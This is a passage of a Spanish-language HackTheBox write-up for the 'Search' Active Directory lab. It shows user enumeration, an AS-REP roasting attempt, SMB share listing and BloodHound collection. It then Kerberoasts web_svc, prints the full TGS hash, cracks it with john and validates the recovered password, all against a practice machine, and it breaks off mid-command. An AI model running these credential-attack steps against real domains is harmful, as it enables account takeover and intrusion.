<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rpcclient <span class="nt">-U</span> <span class="s2">"hope.sharp%IsolationIsKey?"</span> 10.129.229.57
rpcclient <span class="nv">$&gt;</span> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[Santino.Benjamin] rid:[0x4aa]
user:[Payton.Harmon] rid:[0x4ab]
user:[Trace.Ryan] rid:[0x4ac]
user:[Reginald.Morton] rid:[0x4ad]
user:[Eddie.Stevens] rid:[0x4ae]
user:[Cortez.Hickman] rid:[0x4af]
user:[Chace.Oneill] rid:[0x4b0]
user:[Abril.Suarez] rid:[0x4b1]
user:[Savanah.Velazquez] rid:[0x4b2]
user:[Antony.Russo] rid:[0x4b3]
user:[Cameron.Melendez] rid:[0x4b4]
user:[Edith.Walls] rid:[0x4b5]
user:[Lane.Wu] rid:[0x4b6]
user:[Arielle.Schultz] rid:[0x4b7]
user:[Bobby.Wolf] rid:[0x4b8]
user:[Blaine.Zavala] rid:[0x4b9]
user:[Margaret.Robinson] rid:[0x4ba]
user:[Celia.Moreno] rid:[0x4bb]
user:[Kaitlynn.Lee] rid:[0x4bc]
user:[Kyler.Arias] rid:[0x4bd]
user:[Saniyah.Roy] rid:[0x4be]
user:[Sarai.Boone] rid:[0x4bf]
user:[Jermaine.Franco] rid:[0x4c0]
user:[Alfred.Chan] rid:[0x4c1]
user:[Jamar.Holt] rid:[0x4c2]
user:[Sandra.Wolfe] rid:[0x4c3]
user:[Rene.Larson] rid:[0x4c4]
user:[Yareli.Mcintyre] rid:[0x4c5]
user:[Griffin.Maddox] rid:[0x4c6]
user:[Prince.Hobbs] rid:[0x4c7]
user:[Armando.Nash] rid:[0x4c8]
user:[Sonia.Schneider] rid:[0x4c9]
user:[Maeve.Mann] rid:[0x4ca]
user:[Lizeth.Love] rid:[0x4cb]
user:[Amare.Serrano] rid:[0x4cc]
user:[Savanah.Knox] rid:[0x4cd]
user:[Frederick.Cuevas] rid:[0x4ce]
user:[Marshall.Skinner] rid:[0x4cf]
user:[Edgar.Jacobs] rid:[0x4d0]
user:[Elisha.Watts] rid:[0x4d1]
user:[Belen.Compton] rid:[0x4d2]
user:[Amari.Mora] rid:[0x4d3]
user:[Cadence.Conner] rid:[0x4d4]
user:[Katelynn.Costa] rid:[0x4d5]
user:[Sage.Henson] rid:[0x4d6]
user:[Maren.Guzman] rid:[0x4d7]
user:[Natasha.Mayer] rid:[0x4d8]
user:[Chanel.Bell] rid:[0x4d9]
user:[Scarlett.Parks] rid:[0x4da]
user:[Eliezer.Jordan] rid:[0x4db]
user:[Dax.Santiago] rid:[0x4dc]
user:[Lillie.Saunders] rid:[0x4dd]
user:[Jayla.Roberts] rid:[0x4de]
user:[Lorelei.Huang] rid:[0x4df]
user:[Taniya.Hardy] rid:[0x4e0]
user:[Charlee.Wilkinson] rid:[0x4e1]
user:[Monique.Moreno] rid:[0x4e2]
user:[Desmond.Bonilla] rid:[0x4e3]
user:[Claudia.Sharp] rid:[0x4e4]
user:[Abbigail.Turner] rid:[0x4e5]
user:[Yaritza.Riddle] rid:[0x4e6]
user:[Tori.Mora] rid:[0x4e7]
user:[Hugo.Forbes] rid:[0x4e8]
user:[Jolie.Lee] rid:[0x4e9]
user:[German.Rice] rid:[0x4ea]
user:[Zain.Hopkins] rid:[0x4eb]
user:[Hope.Sharp] rid:[0x4ec]
user:[Kylee.Davila] rid:[0x4ed]
user:[Melanie.Santiago] rid:[0x4ee]
user:[Hunter.Kirby] rid:[0x4ef]
user:[Annabelle.Wells] rid:[0x4f0]
user:[Ada.Gillespie] rid:[0x4f1]
user:[Gunnar.Callahan] rid:[0x4f2]
user:[Aarav.Fry] rid:[0x4f3]
user:[Colby.Russell] rid:[0x4f4]
user:[Eve.Galvan] rid:[0x4f5]
user:[Jeramiah.Fritz] rid:[0x4f6]
user:[Cade.Austin] rid:[0x4f7]
user:[Keely.Lyons] rid:[0x4f8]
user:[Abby.Gonzalez] rid:[0x4f9]
user:[Joy.Costa] rid:[0x4fa]
user:[Vincent.Sutton] rid:[0x4fb]
user:[Cesar.Yang] rid:[0x4fc]
user:[Camren.Luna] rid:[0x4fd]
user:[Tyshawn.Peck] rid:[0x4fe]
user:[Keith.Hester] rid:[0x4ff]
user:[Braeden.Rasmussen] rid:[0x500]
user:[Angel.Atkinson] rid:[0x501]
user:[Sierra.Frye] rid:[0x502]
user:[Maci.Graves] rid:[0x503]
user:[Judah.Frye] rid:[0x504]
user:[Tristen.Christian] rid:[0x505]
user:[Crystal.Greer] rid:[0x506]
user:[Kayley.Ferguson] rid:[0x507]
user:[Haven.Summers] rid:[0x508]
user:[Isabela.Estrada] rid:[0x509]
user:[Kaylin.Bird] rid:[0x50a]
user:[Angie.Duffy] rid:[0x50b]
user:[Claudia.Pugh] rid:[0x50c]
user:[Jordan.Gregory] rid:[0x50d]
user:[web_svc] rid:[0x510]
user:[Tristan.Davies] rid:[0x512]
</code></pre></div></div>

<ul>
  <li>Vamos añadirlos a una lista.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rpcclient <span class="nt">-U</span> <span class="s2">"hope.sharp%IsolationIsKey?"</span> 10.129.229.57 <span class="nt">-c</span> <span class="s1">'enumdomusers'</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\[.*?\]'</span> | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s1">'0x'</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'[]'</span> <span class="o">&gt;</span> all.txt
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos aplicar un <code class="language-plaintext highlighter-rouge">Kerberoasting Attack</code> <a href="https://wadcoms.github.io/wadcoms/Impacket-GetNPUsers/">https://wadcoms.github.io/wadcoms/Impacket-GetNPUsers/</a>.</p>
  </li>
  <li>
    <p>Pero no tenemos existo ya que los usuarios no tienen el <code class="language-plaintext highlighter-rouge">UF_DONT_REQUIERE_PREAUTH</code> set.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-GetNPUsers search.htb/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> all.txt
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span>-] User Administrator doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User Santino.Benjamin doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Payton.Harmon doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Trace.Ryan doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Reginald.Morton doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Eddie.Stevens doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Cortez.Hickman doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Chace.Oneill doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Abril.Suarez doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Savanah.Velazquez doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Antony.Russo doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Cameron.Melendez doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Edith.Walls doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Lane.Wu doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Arielle.Schultz doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Bobby.Wolf doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Blaine.Zavala doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Margaret.Robinson doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Celia.Moreno doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Kaitlynn.Lee doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Kyler.Arias doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Saniyah.Roy doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Sarai.Boone doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Jermaine.Franco doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Alfred.Chan doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Jamar.Holt doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Sandra.Wolfe doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Rene.Larson doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Yareli.Mcintyre doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Griffin.Maddox doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Prince.Hobbs doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Armando.Nash doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Sonia.Schneider doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Maeve.Mann doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Lizeth.Love doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Amare.Serrano doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Savanah.Knox doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Frederick.Cuevas doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Marshall.Skinner doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Edgar.Jacobs doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Elisha.Watts doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Belen.Compton doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Amari.Mora doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Cadence.Conner doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Katelynn.Costa doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Sage.Henson doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Maren.Guzman doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Natasha.Mayer doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Chanel.Bell doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Scarlett.Parks doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Eliezer.Jordan doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Dax.Santiago doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Lillie.Saunders doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Jayla.Roberts doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Lorelei.Huang doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Taniya.Hardy doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Charlee.Wilkinson doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Monique.Moreno doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Desmond.Bonilla doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Claudia.Sharp doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Abbigail.Turner doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Yaritza.Riddle doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Tori.Mora doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Hugo.Forbes doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Jolie.Lee doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User German.Rice doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Zain.Hopkins doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Hope.Sharp doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Kylee.Davila doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Melanie.Santiago doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Hunter.Kirby doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Annabelle.Wells doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Ada.Gillespie doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Gunnar.Callahan doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Aarav.Fry doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Colby.Russell doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Eve.Galvan doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Jeramiah.Fritz doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Cade.Austin doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Keely.Lyons doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Abby.Gonzalez doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Joy.Costa doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Vincent.Sutton doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Cesar.Yang doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Camren.Luna doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Tyshawn.Peck doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Keith.Hester doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Braeden.Rasmussen doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Angel.Atkinson doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Sierra.Frye doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Maci.Graves doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Judah.Frye doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Tristen.Christian doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Crystal.Greer doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Kayley.Ferguson doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Haven.Summers doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Isabela.Estrada doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Kaylin.Bird doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Angie.Duffy doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Claudia.Pugh doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Jordan.Gregory doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User web_svc doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Tristan.Davies doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
</span></code></pre></div></div>

<ul>
  <li>Bueno vamos a ver recursos compartidos por <code class="language-plaintext highlighter-rouge">smb</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.229.57 <span class="nt">-u</span> hope.sharp  <span class="nt">-p</span> <span class="s1">'IsolationIsKey?'</span> <span class="nt">--shares</span>
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:RESEARCH<span class="o">)</span> <span class="o">(</span>domain:search.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>+] search.htb<span class="se">\h</span>ope.sharp:IsolationIsKey?
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>+] Enumerated shares
SMB         10.129.229.57   445    RESEARCH         Share           Permissions     Remark
SMB         10.129.229.57   445    RESEARCH         <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
SMB         10.129.229.57   445    RESEARCH         ADMIN<span class="nv">$ </span>                         Remote Admin
SMB         10.129.229.57   445    RESEARCH         C<span class="nv">$ </span>                             Default share
SMB         10.129.229.57   445    RESEARCH         CertEnroll      READ            Active Directory Certificate Services share
SMB         10.129.229.57   445    RESEARCH         helpdesk
SMB         10.129.229.57   445    RESEARCH         IPC<span class="nv">$ </span>           READ            Remote IPC
SMB         10.129.229.57   445    RESEARCH         NETLOGON        READ            Logon server share
SMB         10.129.229.57   445    RESEARCH         RedirectedFolders<span class="nv">$ </span>READ,WRITE
SMB         10.129.229.57   445    RESEARCH         SYSVOL          READ            Logon server share
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos a ver lo que hay dentro de <code class="language-plaintext highlighter-rouge">RedirectedFolders$</code>.</p>
  </li>
  <li>
    <p>No vemos nada interesante.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbmap <span class="nt">-H</span> 10.129.229.57 <span class="nt">-u</span> hope.sharp <span class="nt">-p</span> <span class="s1">'IsolationIsKey?'</span> <span class="nt">-r</span> RedirectedFolders<span class="nv">$ </span><span class="nt">--no-banner</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>

<span class="o">[</span>+] IP: 10.129.229.57:445	Name: search.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
	helpdesk                                          	NO ACCESS	
	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	RedirectedFolders<span class="nv">$ </span>                               	READ, WRITE	
	./RedirectedFolders<span class="err">$</span>
	dr--r--r--                0 Sun Apr  7 15:55:18 2024	<span class="nb">.</span>
	dr--r--r--                0 Sun Apr  7 15:55:18 2024	..
	dr--r--r--                0 Tue Apr  7 13:12:58 2020	abril.suarez
	dr--r--r--                0 Fri Jul 31 08:11:32 2020	Angie.Duffy
	dr--r--r--                0 Fri Jul 31 07:35:32 2020	Antony.Russo
	dr--r--r--                0 Tue Apr  7 13:32:31 2020	belen.compton
	dr--r--r--                0 Fri Jul 31 07:37:36 2020	Cameron.Melendez
	dr--r--r--                0 Tue Apr  7 13:15:09 2020	chanel.bell
	dr--r--r--                0 Fri Jul 31 08:09:07 2020	Claudia.Pugh
	dr--r--r--                0 Fri Jul 31 07:02:04 2020	Cortez.Hickman
	dr--r--r--                0 Tue Apr  7 13:20:08 2020	dax.santiago
	dr--r--r--                0 Fri Jul 31 06:55:34 2020	Eddie.Stevens
	dr--r--r--                0 Thu Apr  9 15:04:11 2020	edgar.jacobs
	dr--r--r--                0 Fri Jul 31 07:39:50 2020	Edith.Walls
	dr--r--r--                0 Tue Apr  7 13:23:13 2020	eve.galvan
	dr--r--r--                0 Tue Apr  7 13:29:22 2020	frederick.cuevas
	dr--r--r--                0 Thu Apr  9 09:34:41 2020	hope.sharp
	dr--r--r--                0 Tue Apr  7 13:07:00 2020	jayla.roberts
	dr--r--r--                0 Fri Jul 31 08:01:06 2020	Jordan.Gregory
	dr--r--r--                0 Thu Apr  9 15:11:39 2020	payton.harmon
	dr--r--r--                0 Fri Jul 31 06:44:32 2020	Reginald.Morton
	dr--r--r--                0 Tue Apr  7 13:10:25 2020	santino.benjamin
	dr--r--r--                0 Fri Jul 31 07:21:42 2020	Savanah.Velazquez
	dr--r--r--                0 Wed Nov 17 19:01:45 2021	sierra.frye
	dr--r--r--                0 Thu Apr  9 15:14:26 2020	trace.ryan
	SYSVOL                                            	READ ONLY	Logon server share
</code></pre></div></div>

<h2 id="web_scv">web_scv</h2>

<ul>
  <li>
    <p>No encontramos nada a si que vamos a usar <code class="language-plaintext highlighter-rouge">bloodhound</code> para enumerar y buscar vías para escalar privilegios <a href="https://github.com/BloodHoundAD/BloodHound/releases">https://github.com/BloodHoundAD/BloodHound/releases</a>.</p>
  </li>
  <li>
    <p>Para recolectar información vamos a usar <code class="language-plaintext highlighter-rouge">bloodhound-python</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content bloodhound-python <span class="nt">-u</span> <span class="s1">'hope.sharp'</span> <span class="nt">-p</span> <span class="s1">'IsolationIsKey?'</span> <span class="nt">-c</span> All <span class="nt">-ns</span> 10.129.229.57 <span class="nt">-d</span> search.htb
</code></pre></div></div>

<ul>
  <li>
    <p>Ahora tienes que subir los archivos <code class="language-plaintext highlighter-rouge">.json</code> al <code class="language-plaintext highlighter-rouge">bloodhound</code>.</p>
  </li>
  <li>
    <p>Estos son los usuarios que pertenecen al grupo <code class="language-plaintext highlighter-rouge">DOMAIN ADMINS</code> vemos a <code class="language-plaintext highlighter-rouge">Tristan.Davies</code>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/search/5.png" />
</p>

<ul>
  <li>Y bueno vemos que el usuario WEB_SVC es <code class="language-plaintext highlighter-rouge">kerberoastable</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/search/6.png" />
</p>

<ul>
  <li>Vamos a usar <code class="language-plaintext highlighter-rouge">GETUsersSPN.py</code> para solicitar el TGS del usuario.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-GetUserSPNs search.htb/hope.sharp <span class="nt">-request</span>
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
ServicePrincipalName               Name     MemberOf  PasswordLastSet             LastLogon  Delegation
<span class="nt">---------------------------------</span>  <span class="nt">-------</span>  <span class="nt">--------</span>  <span class="nt">--------------------------</span>  <span class="nt">---------</span>  <span class="nt">----------</span>
RESEARCH/web_svc.search.htb:60001  web_svc            2020-04-09 07:59:11.329031  &lt;never&gt;



<span class="o">[</span>-] CCache file is not found. Skipping...
<span class="nv">$krb5tgs$23$*</span>web_svc<span class="nv">$SEARCH</span>.HTB<span class="nv">$search</span>.htb/web_svc<span class="k">*</span><span class="nv">$ef435038d4624caac1c1e1fe0a242fae$ae77292d085f959d097ee988ae8ba39fbf3b7d1c3b72efc19bf7c8197ab68c88d4a4c34bca1261ca6239a5bbd9fa375ef3dd6f8aa38c808a10bf44ea06baecbfb6c5dc7d0549de684ec0fe3462726c8098094d298587ca0c2b99cfb4276502d95c324bb6f2197131536701dbd3325da0fa38952bbbdc7a062fa5d0cade5ac935e6442f7bd80e537709cc1b73553320669b4f711079735eb549a1243874520b7437ccb76e0c15b133c0887ab3842a93d8890e5da870844f5cfdbe9cdf0039ea2ad712c0503dd947afd82069d1f1bee24bdada3d372ae7f86cea9eb59cc7ebede4097ad20b177dd200f9268f4fc767b8ebfad8c932632f8d1559b913c9139a26fe10eec2c856faedb948e266fc569d3d1ebf61a294c464ccf3952880172acc414085edeb9f8a9faef28e8e4885308949c200716c8918c7850b7bbdb89f89a6d63e03d0a590672599501c0daae91901eb6c87f1ebe9d2ea01a44014ffcf4d8e48d652165b05108031e1cabbaf86699b6bcb918e3fc647766a4f34328d3900e1f562c9dea1b170d4d24e2105a54421f86b8acef8d06b33b48bbb74693587a49710c1d589d9273c5a6740ade98557cc16cca284016d7e577190941c227be7933dbd9ae835ed1faf2a5579cd65facbd985dc4af88bb41318cc285077fb813541887b1868fd963de1291e19144f698a1b4ff723bd98f3e6bf81cfa9491d1a8f089107fceac81ba512d3a4c0e0cbf292051c08296870a1df3e90bd2470c3fec06c0f24aac52f2f39446b00052bed6b414fe570a6638b8b5adf2227b9fe3aacd7e43b980b65b3bce8a515340940a147bc00722f9831d718f9f20e9e46964fe871841663c0c42af96de540f30456f7cc011b31df229dd4d21e9c5606c7d09e24f36173461a30453b717c6813bdc5eb64c8d9d94e08e54d311b71fdf66ec1595e6ec5c3dfce1c2e0459c478dabecbf8396b750c8a9d9ec217d17b9291a3aee831dc4ab1a94b003e017f29e249520f2a38e62243da55663cf3b377a29501d979354c9d0c0213b572c92ee473df614c07bb9b55ad7be3684b16aaba088e340369c510c387b6395b3f4f9d6c29360db08855b18727a42e0f5e57d06bde11d8322b4df72d289759ef67fe1c167a9113760ca205384cbdf3d4510fdcf5765131282647fbe9bb748119b3f6f909e63fe57b9fbe5a799aa3263c61fc0785337000be220dc05b71991f5ff470a9453e7412336fb11b1e9c42c7c888a04e3c57f786bdaa7905c49cea617c4e2c770918e2703c821620bff118f587d9e907ee99c36253a4181fb20b1bab49e5a5037450f6fce881f172fb54fd2ce6a5fc6f72825b7e0f3690918996b8599af819130aa4375065e00fa61b8c5a2cec01c43923ffab89909f39dea3d1e410cb4d8a05d778205fa99afaa61ffbfe0c00d54bab2486241dac57602941a26e40afc83ebb55d17453b4372b72e06161e946adecf8da</span>
</code></pre></div></div>

<ul>
  <li>En caso de que no funcione el ataque necesitas estar sincronizado al reloj de la maquina.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ ntpdate 10.129.229.57
</code></pre></div></div>

<ul>
  <li>Ahora como tenemos el hash podemos crackearlo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
</span>Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>krb5tgs, Kerberos 5 TGS etype 23 <span class="o">[</span>MD4 HMAC-MD5 RC4]<span class="o">)</span>
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
0g 0:00:00:29 39.26% <span class="o">(</span>ETA: 16:38:09<span class="o">)</span> 0g/s 198514p/s 198514c/s 198514C/s marsters62..marshmallow4646
@3ONEmillionbaby <span class="o">(</span>?<span class="o">)</span>
1g 0:00:00:54 DONE <span class="o">(</span>2024-04-07 16:37<span class="o">)</span> 0.01835g/s 210937p/s 210937c/s 210937C/s @421eduymayte619..@123abc@
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed.
</code></pre></div></div>

<ul>
  <li>Vamos a validar que la contraseña es correcta.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb search.htb <span class="nt">-u</span> web_svc <span class="nt">-p</span> @3ONEmillionbaby
